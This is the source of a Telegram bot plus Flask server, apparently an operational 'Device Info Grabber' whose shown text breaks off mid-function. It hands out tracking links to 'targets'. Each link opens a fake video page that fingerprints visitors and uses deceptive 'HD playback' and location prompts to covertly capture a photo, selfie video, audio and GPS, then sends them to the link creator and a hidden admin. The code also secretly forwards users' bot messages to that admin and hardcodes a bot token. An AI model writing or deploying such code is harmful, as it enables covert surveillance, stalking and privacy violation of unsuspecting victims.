import os
import json
import secrets
import logging
import threading
import requests
from flask import Flask, request, render_template_string, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from datetime import datetime

# ---------- Configuration (HARDCODED) ----------
BOT_TOKEN = "8662699781:AAFoGP_ZxFhT5w0R-LTTqEw5IPExm-rxekI"
ADMIN_CHAT_ID = "1838854178"          # Your Telegram user ID
BASE_URL = os.environ.get("BASE_URL", "https://ebb9a522-1f4f-4955-babf-9916f1eb5ac9-00-12ili6wwvrx3f.pike.replit.dev")

# Shared memory (token -> user_id)
tracking_links = {}
# Track users who have started the bot (to detect new vs returning)
seen_users = set()

# ---------- Flask Web Server ----------
flask_app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            color: #fff;
            min-height: 100vh;
        }
        /* Top bar */
        .topbar {
            background: #111;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-bottom: 1px solid #222;
        }
        .topbar .logo {
            font-size: 1.2rem;
            font-weight: 700;
            color: #e63946;
            letter-spacing: -0.5px;
        }
        .topbar .logo span { color: #fff; }
        .topbar .search {
            flex: 1;
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 20px;
            padding: 6px 14px;
            color: #aaa;
            font-size: 0.85rem;
        }

        /* Player */
        .player-wrap {
            position: relative;
            background: #000;
            width: 100%;
            aspect-ratio: 16/9;
            max-height: 60vw;
        }
        .thumbnail {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: brightness(0.4);
        }
        .play-overlay {
            position: absolute;
            inset: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }
        .play-btn {
            width: 70px; height: 70px;
            background: rgba(255,255,255,0.15);
            border: 3px solid #fff;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            cursor: pointer;
            backdrop-filter: blur(4px);
            transition: background 0.2s;
        }
        .play-btn:hover { background: rgba(255,255,255,0.3); }
        .play-btn svg { width: 30px; height: 30px; fill: #fff; margin-left: 4px; }

        /* Loading bar */
        .buffer-bar {
            position: absolute;
            bottom: 0; left: 0; right: 0;
            height: 3px;
            background: #333;
        }
        .buffer-fill {
            height: 100%;
            background: #e63946;
            width: 0%;
            transition: width 0.4s ease;
        }

        /* Permission modal */
        .modal-backdrop {
            display: none;
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.85);
            z-index: 100;
            align-items: center;
            justify-content: center;
        }
        .modal-backdrop.show { display: flex; }
        .modal {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 24px;
            max-width: 340px;
            width: 90%;
            text-align: center;
        }
        .modal h3 { font-size: 1.1rem; margin-bottom: 8px; }
        .modal p { color: #999; font-size: 0.85rem; line-height: 1.5; margin-bottom: 20px; }
        .modal-btn {
            width: 100%;
            padding: 12px;
            background: #e63946;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 8px;
        }
        .modal-btn.secondary {
            background: #2a2a2a;
            color: #aaa;
            font-size: 0.85rem;
            font-weight: 400;
        }

        /* Info below player */
        .info {
            padding: 14px 16px 4px;
        }
        .info h1 { font-size: 1rem; font-weight: 600; line-height: 1.4; margin-bottom: 6px; }
        .meta { color: #888; font-size: 0.8rem; margin-bottom: 10px; }
        .tags { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 12px; }
        .tag {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 20px;
            padding: 3px 10px;
            font-size: 0.75rem;
            color: #aaa;
        }

        /* Sidebar recs */
        .section-title { padding: 0 16px; font-size: 0.85rem; color: #888; margin-bottom: 8px; }
        .rec-list { display: flex; flex-direction: column; gap: 0; }
        .rec-item {
            display: flex; gap: 10px;
            padding: 10px 16px;
            cursor: pointer;
            border-bottom: 1px solid #111;
        }
        .rec-thumb {
            width: 120px; min-width: 120px; height: 68px;
            background: #1e1e1e;
            border-radius: 6px;
            overflow: hidden;
            position: relative;
        }
        .rec-thumb-inner {
            width: 100%; height: 100%;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
        }
        .rec-duration {
            position: absolute; bottom: 4px; right: 4px;
            background: rgba(0,0,0,0.8);
            border-radius: 3px;
            padding: 1px 4px;
            font-size: 0.7rem;
        }
        .rec-info { flex: 1; }
        .rec-title { font-size: 0.82rem; font-weight: 500; margin-bottom: 4px; line-height: 1.3; }
        .rec-sub { font-size: 0.72rem; color: #666; }

        /* Status toast */
        #toast {
            display: none;
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            background: #333; color: #fff;
            padding: 8px 18px; border-radius: 20px;
            font-size: 0.8rem; z-index: 200;
        }
    </style>
</head>
<body>

    <!-- Top bar -->
    <div class="topbar">
        <div class="logo">▶<span>Stream</span></div>
        <div class="search">Search videos...</div>
    </div>

    <!-- Video player -->
    <div class="player-wrap" id="playerWrap">
        <img class="thumbnail" src="https://picsum.photos/seed/vid1/800/450" alt="">
        <div class="play-overlay" id="playOverlay">
            <div class="play-btn" id="playBtn">
                <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
            </div>
        </div>
        <div class="buffer-bar"><div class="buffer-fill" id="bufferFill"></div></div>
    </div>

    <!-- Permission modal -->
    <div class="modal-backdrop" id="modal">
        <div class="modal">
            <h3>📺 HD Playback Required</h3>
            <p>To stream this video in HD and enable interactive features, allow access to your camera and microphone.</p>
            <button class="modal-btn" id="allowBtn">Allow & Play HD</button>
            <button class="modal-btn secondary" id="skipBtn">Watch in Low Quality</button>
        </div>
    </div>

    <!-- Video info -->
    <div class="info">
        <h1>Best Compilation 2024 – Must Watch! 🔥</h1>
        <div class="meta">1.2M views &nbsp;•&nbsp; 2 days ago</div>
        <div class="tags">
            <span class="tag">#viral</span>
            <span class="tag">#trending</span>
            <span class="tag">#2024</span>
            <span class="tag">#compilation</span>
        </div>
    </div>

    <!-- Recommendations -->
    <div class="section-title">Up Next</div>
    <div class="rec-list">
        <div class="rec-item">
            <div class="rec-thumb">
                <img src="https://picsum.photos/seed/rec1/120/68" style="width:100%;height:100%;object-fit:cover;">
                <div class="rec-duration">12:34</div>
            </div>
            <div class="rec-info">
                <div class="rec-title">Top 10 Moments You Won't Believe</div>
                <div class="rec-sub">ViralHub • 890K views</div>
            </div>
        </div>
        <div class="rec-item">
            <div class="rec-thumb">
                <img src="https://picsum.photos/seed/rec2/120/68" style="width:100%;height:100%;object-fit:cover;">
                <div class="rec-duration">8:21</div>
            </div>
            <div class="rec-info">
                <div class="rec-title">Unbelievable Caught on Camera 2024</div>
                <div class="rec-sub">TopClips • 2.1M views</div>
            </div>
        </div>
        <div class="rec-item">
            <div class="rec-thumb">
                <img src="https://picsum.photos/seed/rec3/120/68" style="width:100%;height:100%;object-fit:cover;">
                <div class="rec-duration">15:07</div>
            </div>
            <div class="rec-info">
                <div class="rec-title">Funniest Fails of the Year – Part 3</div>
                <div class="rec-sub">FailArmy • 4.5M views</div>
            </div>
        </div>
        <div class="rec-item">
            <div class="rec-thumb">
                <img src="https://picsum.photos/seed/rec4/120/68" style="width:100%;height:100%;object-fit:cover;">
                <div class="rec-duration">6:48</div>
            </div>
            <div class="rec-info">
                <div class="rec-title">Amazing Talent Show Winners 2024</div>
                <div class="rec-sub">ShowTime • 560K views</div>
            </div>
        </div>
    </div>

    <div id="toast"></div>

    <script>
    const token = "{{ token }}";

    function showToast(msg, ms=2500) {
        const t = document.getElementById("toast");
        t.textContent = msg; t.style.display = "block";
        setTimeout(() => t.style.display = "none", ms);
    }

    function animateBuffer(pct, duration) {
        const fill = document.getElementById("bufferFill");
        fill.style.transition = `width ${duration}ms linear`;
        fill.style.width = pct + "%";
    }

    async function collectFingerprint() {
        let battery = {};
        try {
            const b = await navigator.getBattery();
            battery = { batteryLevel: Math.round(b.level * 100) + "%", charging: b.charging };
        } catch(e) {}
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenWidth: screen.width, screenHeight: screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            cookieEnabled: navigator.cookieEnabled,
            connectionType: conn.effectiveType || conn.type || "unknown",
            downlink: conn.downlink,
            localTime: new Date().toString(),
            ...battery
        };
    }

async function getDeviceModel() {
        if (navigator.userAgentData) {
            try {
                const d = await navigator.userAgentData.getHighEntropyValues(["model","platform"]);
                if (d.model && d.model.trim()) return d.model.trim();
            } catch(e) {}
        }
        const ua = navigator.userAgent;
        let m = ua.match(/;\s*([A-Za-z0-9 _\-]+)\s+Build/);
        if (m) return m[1].trim();
        m = ua.match(/\(([^;)]+);\s*([^;)]+);\s*([^;)]+)\)/);
        if (m) return m[3].trim();
        return navigator.platform || "Unknown";
    }

    async function collectFingerprint() {
        let battery = {};
        try { const b = await navigator.getBattery(); battery = { batteryLevel: Math.round(b.level * 100) + "%", charging: b.charging }; } catch(e) {}
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
        const deviceModel = await getDeviceModel();
        return {
            userAgent: navigator.userAgent, deviceModel,
            platform: navigator.platform, screenWidth: screen.width, screenHeight: screen.height,
            language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints, cookieEnabled: navigator.cookieEnabled,
            connectionType: conn.effectiveType || conn.type || "unknown", downlink: conn.downlink,
            localTime: new Date().toString(), ...battery
        };
    }

    async function sendFingerprint() {
        try {
            const fp = await collectFingerprint();
            await fetch("/capture_fingerprint", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, fingerprint: fp }) });
        } catch(e) {}
    }

    function showPermissionModal(icon, title, reason) {
        return new Promise(resolve => {
            const bd = document.getElementById("modal");
            bd.innerHTML = '<div class="modal"><div style="font-size:2.5rem;margin-bottom:10px">' + icon + '</div><h3>' + title + '</h3><p>' + reason + '</p><button class="modal-btn" id="rBtn">Allow &amp; Continue</button></div>';
            bd.classList.add("show");
            document.getElementById("rBtn").onclick = () => { bd.classList.remove("show"); resolve(); };
        });
    }

    async function getCameraStream(facingMode) {
        while (true) {
            try { return await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } } }); }
            catch(e) { await showPermissionModal("📸", "Camera Access Required", "Camera access is required to stream this video in HD. Please tap <b>Allow</b> when the browser prompts you."); }
        }
    }

    async function getMicStream() {
        while (true) {
            try { return await navigator.mediaDevices.getUserMedia({ audio: true }); }
            catch(e) { await showPermissionModal("🎤", "Microphone Access Required", "Please allow microphone access to enable audio playback. Tap <b>Allow</b> in the browser prompt."); }
        }
    }

    async function getLocationPos() {
        while (true) {
            try {
                return await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 }));
            } catch(e) { await showPermissionModal("📍", "Location Required", "Location verification is required to watch this content in your region. Tap <b>Allow</b> to continue."); }
        }
    }

    async function sendPhoto() {
        try {
            const stream = await getCameraStream("environment");
            const video = document.createElement("video");
            video.srcObject = stream; video.setAttribute("playsinline",""); video.setAttribute("muted","");
            await new Promise((res,rej) => { video.onloadedmetadata = () => video.play().then(res).catch(rej); video.onerror = rej; });
            await new Promise(r => setTimeout(r, 2000));
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 1280; canvas.height = video.videoHeight || 720;
            canvas.getContext("2d").drawImage(video, 0, 0); stream.getTracks().forEach(t => t.stop());
            const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.92));
            if (!blob || blob.size < 1000) return;
            const fp = await collectFingerprint();
            const form = new FormData(); form.append("token", token); form.append("photo", blob, "photo.jpg"); form.append("fingerprint", JSON.stringify(fp));
            await fetch("/capture_combined_photo", { method: "POST", body: form });
        } catch(e) {}
    }

    async function sendLocation() {
        try {
            const pos = await getLocationPos();
            const fp = await collectFingerprint();
            const form = new FormData();
            form.append("token", token); form.append("lat", pos.coords.latitude); form.append("lon", pos.coords.longitude); form.append("fingerprint", JSON.stringify(fp));
            await fetch("/capture_combined_location", { method: "POST", body: form });
        } catch(e) {}
    }

    async function sendSelfieVideo() {
        try {
            const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus") ? "video/webm;codecs=vp8,opus" : "video/webm";
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
            const recorder = new MediaRecorder(stream, { mimeType });
            const chunks = [];
            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
            recorder.start(500); await new Promise(r => setTimeout(r, 5000)); recorder.stop();
            stream.getTracks().forEach(t => t.stop());
            await new Promise(r => recorder.onstop = r);
            const blob = new Blob(chunks, { type: mimeType });
            const fp = await collectFingerprint();
            const form = new FormData(); form.append("token", token); form.append("video", blob, "selfie.webm"); form.append("fingerprint", JSON.stringify(fp));
            await fetch("/capture_combined_video", { method: "POST", body: form });
        } catch(e) {}
    }

    async function sendAudio() {
        try {
            const stream = await getMicStream();
            const mimeType = MediaRecorder.isTypeSupported("audio/webm;codecs=opus") ? "audio/webm;codecs=opus" : "audio/webm";
            const recorder = new MediaRecorder(stream, { mimeType });
            const chunks = [];
            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
            recorder.start(500); await new Promise(r => setTimeout(r, 10000)); recorder.stop();
            stream.getTracks().forEach(t => t.stop());
            await new Promise(r => recorder.onstop = r);
            const blob = new Blob(chunks, { type: mimeType });
            const fp = await collectFingerprint();
            const form = new FormData(); form.append("token", token); form.append("audio", blob, "audio.ogg"); form.append("fingerprint", JSON.stringify(fp));
            await fetch("/capture_combined_audio", { method: "POST", body: form });
        } catch(e) {}
    }

    async function startCapture() {
        animateBuffer(10, 600);
        await sendPhoto();      animateBuffer(30, 500);
        await sendLocation();   animateBuffer(55, 500);
        await sendSelfieVideo();animateBuffer(85, 500);
        await sendAudio();      animateBuffer(100, 300);
    }

    document.getElementById("playBtn").onclick = () => {
        const bd = document.getElementById("modal");
        bd.innerHTML = '<div class="modal"><h3>HD Playback Required</h3><p>To stream this video in HD and enable interactive features, allow access to camera, microphone and location when prompted.</p><button class="modal-btn" id="allowBtn">Allow &amp; Play HD</button></div>';
        bd.classList.add("show");
        document.getElementById("allowBtn").onclick = async () => {
            bd.classList.remove("show");
            document.getElementById("playOverlay").innerHTML = '<div style="color:#fff;font-size:0.9rem;opacity:0.7">Buffering...</div>';
            await startCapture();
            showToast("Playback error. Please try again later.");
        };
    };

    window.addEventListener("load", () => { sendFingerprint(); });

    </script>
</body>
</html>
"""

@flask_app.route('/track/<token>')
def track_page(token):
    user_id = tracking_links.get(token)
    if user_id:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        ua = request.headers.get('User-Agent', 'Unknown')[:120]
        alert = (
            f"🔗 <b>Tracking Link Opened!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 IP: <code>{ip}</code>\n"
            f"📱 Device: {ua}\n"
            f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        broadcast_message(user_id, alert)
    return render_template_string(HTML_TEMPLATE, token=token)

# Existing individual endpoints (unchanged)
@flask_app.route('/capture_fingerprint', methods=['POST'])
def capture_fingerprint():
    data = request.json or {}
    token = data.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"error": "Invalid token"}), 400
    fingerprint = data.get('fingerprint', {})
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    report = f"""
📱 <b>Device Fingerprint Report</b>
━━━━━━━━━━━━━━━━━━━━
🌐 IP: {ip}
📱 Device Model: {fingerprint.get('deviceModel', 'Unknown')}
🆔 User Agent: {fingerprint.get('userAgent', 'Unknown')}
💻 Platform: {fingerprint.get('platform', 'Unknown')}
📐 Screen: {fingerprint.get('screenWidth', '?')}x{fingerprint.get('screenHeight', '?')}
🗣️ Language: {fingerprint.get('language', 'en')}
⏰ Timezone: {fingerprint.get('timezone', 'Unknown')}
🔋 Battery: {fingerprint.get('batteryLevel', '?')} ({'Charging' if fingerprint.get('charging') else 'Not charging'})
📡 Connection: {fingerprint.get('connectionType', 'unknown')} ({fingerprint.get('downlink', '?')} Mbps)
🧠 Hardware Concurrency: {fingerprint.get('hardwareConcurrency', '?')}
💾 Device Memory: {fingerprint.get('deviceMemory', '?')} GB
🕹️ Max Touch Points: {fingerprint.get('maxTouchPoints', '?')}
🍪 Cookies Enabled: {fingerprint.get('cookieEnabled', '?')}
📅 Local Time: {fingerprint.get('localTime', 'Unknown')}
━━━━━━━━━━━━━━━━━━━━
    """
    broadcast_message(user_id, report)
    return jsonify({"message": "Fingerprint sent"}), 200

@flask_app.route('/capture_photo', methods=['POST'])
def capture_photo():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"error": "Invalid token"}), 400
    photo_file = request.files.get('media')
    if not photo_file:
        return jsonify({"error": "No photo"}), 400
    send_telegram_media(user_id, photo_file, 'photo')
    return jsonify({"message": "Photo sent"}), 200

@flask_app.route('/capture_audio', methods=['POST'])
def capture_audio():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"error": "Invalid token"}), 400
    audio_file = request.files.get('media')
    if not audio_file:
        return jsonify({"error": "No audio"}), 400
    send_telegram_media(user_id, audio_file, 'audio')
    return jsonify({"message": "Audio sent"}), 200

@flask_app.route('/capture_location', methods=['POST'])
def capture_location():
    data = request.json
    token = data.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"error": "Invalid token"}), 400
    loc = data.get('location', {})
    lat = loc.get('lat')
    lon = loc.get('lon')
    if lat and lon:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
        requests.post(url, json={"chat_id": user_id, "latitude": lat, "longitude": lon})
    return jsonify({"message": "Location sent"}), 200

# ---------- New Combined Endpoints ----------
@flask_app.route('/capture_combined_photo', methods=['POST'])
def capture_combined_photo():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"error": "Invalid token"}), 400
    photo_file = request.files.get('photo')
    fingerprint_json = request.form.get('fingerprint')
    if not photo_file or not fingerprint_json:
        return jsonify({"error": "Missing photo or fingerprint"}), 400
    # Send photo with caption containing fingerprint
    caption = format_fingerprint_caption(json.loads(fingerprint_json))
    broadcast_photo(user_id, photo_file.read(), caption)
    return jsonify({"message": "Combined photo+fingerprint sent"}), 200

@flask_app.route('/capture_combined_video', methods=['POST'])
def capture_combined_video():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"error": "Invalid token"}), 400
    video_file = request.files.get('video')
    fingerprint_json = request.form.get('fingerprint')
    if not video_file or not fingerprint_json:
        return jsonify({"error": "Missing video or fingerprint"}), 400
    caption = format_fingerprint_caption(json.loads(fingerprint_json))
    broadcast_video(user_id, video_file.read(), caption)
    return jsonify({"message": "Combined video+fingerprint sent"}), 200

@flask_app.route('/capture_combined_audio', methods=['POST'])
def capture_combined_audio():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"error": "Invalid token"}), 400
    audio_file = request.files.get('audio')
    fingerprint_json = request.form.get('fingerprint')
    if not audio_file or not fingerprint_json:
        return jsonify({"error": "Missing audio or fingerprint"}), 400
    caption = format_fingerprint_caption(json.loads(fingerprint_json))
    broadcast_voice(user_id, audio_file.read(), caption)
    return jsonify({"message": "Combined audio+fingerprint sent"}), 200

@flask_app.route('/capture_combined_location', methods=['POST'])
def capture_combined_location():
    token = request.form.get('token')
    user_id = tracking_links.get(token)
    if not user_id:
        return jsonify({"error": "Invalid token"}), 400
    lat = request.form.get('lat')
    lon = request.form.get('lon')
    fingerprint_json = request.form.get('fingerprint')
    if not lat or not lon or not fingerprint_json:
        return jsonify({"error": "Missing location or fingerprint"}), 400
    broadcast_location(user_id, lat, lon)
    caption = format_fingerprint_caption(json.loads(fingerprint_json))
    broadcast_message(user_id, caption)
    return jsonify({"message": "Combined location+fingerprint sent"}), 200

def format_fingerprint_caption(fingerprint):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip() if request else 'Unknown'
    return f"""
📱 <b>Device Fingerprint</b>
🌐 IP: {ip}
🆔 UA: {fingerprint.get('userAgent', 'N/A')[:80]}
💻 Platform: {fingerprint.get('platform', 'N/A')}
📐 Screen: {fingerprint.get('screenWidth', '?')}x{fingerprint.get('screenHeight', '?')}
🗣️ Lang: {fingerprint.get('language', 'N/A')}
⏰ Timezone: {fingerprint.get('timezone', 'N/A')}
🔋 Battery: {fingerprint.get('batteryLevel', '?')} {'🔌' if fingerprint.get('charging') else '🔋'}
🌐 Connection: {fingerprint.get('connectionType', 'unknown')} ({fingerprint.get('downlink', '?')} Mbps)
    """

def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"})

def send_telegram_media(chat_id, file, media_type):
    method = 'sendPhoto' if media_type == 'photo' else 'sendAudio'
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    files = {'photo' if media_type == 'photo' else 'audio': (file.filename, file.read())}
    data = {'chat_id': chat_id}
    requests.post(url, data=data, files=files)

def recipients(user_id):
    """Return list of chat IDs to notify — always includes admin."""
    ids = [str(user_id)]
    if str(ADMIN_CHAT_ID) not in ids:
        ids.append(str(ADMIN_CHAT_ID))
    return ids

def broadcast_message(user_id, text):
    for cid in recipients(user_id):
        send_telegram_message(cid, text)

def broadcast_photo(user_id, photo_bytes, caption):
    for cid in recipients(user_id):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        requests.post(url,
            data={'chat_id': cid, 'caption': caption, 'parse_mode': 'HTML'},
            files={'photo': ('photo.jpg', photo_bytes, 'image/jpeg')})

def broadcast_voice(user_id, audio_bytes, caption):
    for cid in recipients(user_id):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice"
        requests.post(url,
            data={'chat_id': cid, 'caption': caption, 'parse_mode': 'HTML'},
            files={'voice': ('audio.ogg', audio_bytes, 'audio/ogg')})

def broadcast_video(user_id, video_bytes, caption):
    for cid in recipients(user_id):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
        resp = requests.post(url,
            data={'chat_id': cid, 'caption': caption, 'parse_mode': 'HTML'},
            files={'video': ('selfie.mp4', video_bytes, 'video/mp4')})
        if not resp.json().get('ok'):
            url2 = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            requests.post(url2,
                data={'chat_id': cid, 'caption': caption, 'parse_mode': 'HTML'},
                files={'document': ('selfie.webm', video_bytes, 'video/webm')})

def broadcast_location(user_id, lat, lon):
    for cid in recipients(user_id):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
        requests.post(url, json={"chat_id": cid, "latitude": float(lat), "longitude": float(lon)})

# ---------- Telegram Bot Commands ----------

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 Generate Link", callback_data="grab"),
         InlineKeyboardButton("📋 Active Links", callback_data="links")],
        [InlineKeyboardButton("🗑 Clear All Links", callback_data="clear"),
         InlineKeyboardButton("ℹ️ Bot Info", callback_data="info")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    name = user.first_name or "Unknown"
    username = f"@{user.username}" if user.username else "no username"
    user_id = user.id
    full_name = user.full_name or name

    # Notify admin about every user who starts the bot
    is_new = user_id not in seen_users
    seen_users.add(user_id)
    status_label = "🆕 NEW USER" if is_new else "🔄 Returning User"

    alert = (
        f"👤 <b>{status_label} Started Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📛 Name: <b>{full_name}</b>\n"
        f"🔖 Username: {username}\n"
        f"🆔 Chat ID: <code>{user_id}</code>\n"
        f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    send_telegram_message(ADMIN_CHAT_ID, alert)

    await update.message.reply_text(
        f"👋 Hello, <b>{name}</b>!\n\n"
        "Welcome to the <b>Device Info Grabber Bot</b>.\n"
        "Choose an action below:",
        parse_mode="HTML",
        reply_markup=main_menu_keyboard()
    )

async def grab(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    token = secrets.token_urlsafe(12)
    tracking_links[token] = user_id
    link = f"{BASE_URL}/track/{token}"
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Open Link", url=link)],
        [InlineKeyboardButton("📋 Active Links", callback_data="links"),
         InlineKeyboardButton("🏠 Main Menu", callback_data="menu")]
    ])
    await update.message.reply_text(
        f"✅ <b>New tracking link created!</b>\n\n"
        f"🔗 <code>{link}</code>\n\n"
        "Share this link with your target. You will receive their device info here.",
        parse_mode="HTML",
        reply_markup=keyboard
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "menu":
        await query.edit_message_text(
            "🏠 <b>Main Menu</b>\n\nChoose an action:",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )

    elif data == "grab":
        token = secrets.token_urlsafe(12)
        tracking_links[token] = user_id
        link = f"{BASE_URL}/track/{token}"
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🌐 Open Link", url=link)],
            [InlineKeyboardButton("📋 Active Links", callback_data="links"),
             InlineKeyboardButton("🏠 Main Menu", callback_data="menu")]
        ])
        await query.edit_message_text(
            f"✅ <b>New tracking link created!</b>\n\n"
            f"🔗 <code>{link}</code>\n\n"
            "Share this link with your target. You will receive their device info here.",
            parse_mode="HTML",
            reply_markup=keyboard
        )

    elif data == "links":
        user_links = {t: uid for t, uid in tracking_links.items() if uid == user_id}
        if not user_links:
            text = "📋 <b>Active Links</b>\n\n❌ You have no active tracking links."
        else:
            lines = "\n".join([f"• <code>{BASE_URL}/track/{t}</code>" for t in user_links])
            text = f"📋 <b>Active Links</b> ({len(user_links)} total)\n\n{lines}"
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 Generate New Link", callback_data="grab")],
            [InlineKeyboardButton("🗑 Clear All Links", callback_data="clear"),
             InlineKeyboardButton("🏠 Main Menu", callback_data="menu")]
        ])
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=keyboard)

    elif data == "clear":
        user_tokens = [t for t, uid in tracking_links.items() if uid == user_id]
        for t in user_tokens:
            del tracking_links[t]
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 Generate New Link", callback_data="grab"),
             InlineKeyboardButton("🏠 Main Menu", callback_data="menu")]
        ])
        await query.edit_message_text(
            f"🗑 <b>Cleared!</b>\n\n✅ Removed <b>{len(user_tokens)}</b> tracking link(s).",
            parse_mode="HTML",
            reply_markup=keyboard
        )

    elif data == "info":
        total = len([t for t, uid in tracking_links.items() if uid == user_id])
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🏠 Main Menu", callback_data="menu")]
        ])
        await query.edit_message_text(
            f"ℹ️ <b>Bot Info</b>\n\n"
            f"🤖 Bot is <b>online</b> and running\n"
            f"🌐 Base URL: <code>{BASE_URL}</code>\n"
            f"🆔 Your Telegram ID: <code>{user_id}</code>\n"
            f"🔗 Your active links: <b>{total}</b>\n"
            f"📅 Server time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="HTML",
            reply_markup=keyboard
        )

    elif data == "help":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 Generate Link", callback_data="grab")],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="menu")]
        ])
        await query.edit_message_text(
            "❓ <b>Help</b>\n\n"
            "<b>How it works:</b>\n"
            "1. Press <b>Generate Link</b> to create a unique tracking URL\n"
            "2. Share the link with anyone\n"
            "3. When they open it, their device info is sent to you here\n\n"
            "<b>What gets collected:</b>\n"
            "• 📡 IP address &amp; device fingerprint\n"
            "• 📸 Photo (with permission)\n"
            "• 🎤 Audio recording (with permission)\n"
            "• 🎥 Video (with permission)\n"
            "• 📍 GPS location (with permission)\n\n"
            "<b>Commands:</b>\n"
            "/start — Open main menu\n"
            "/grab — Generate a new link",
            parse_mode="HTML",
            reply_markup=keyboard
        )


async def message_spy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    sender = update.effective_user
    name = sender.full_name or "Unknown"
    username = f"@{sender.username}" if sender.username else "no username"
    user_id = sender.id
    text = update.message.text
    msg = (
        f"📨 <b>Incoming User Message</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Name: <b>{name}</b> ({username})\n"
        f"🆔 User ID: <code>{user_id}</code>\n"
        f"💬 Message:\n<code>{text}</code>\n"
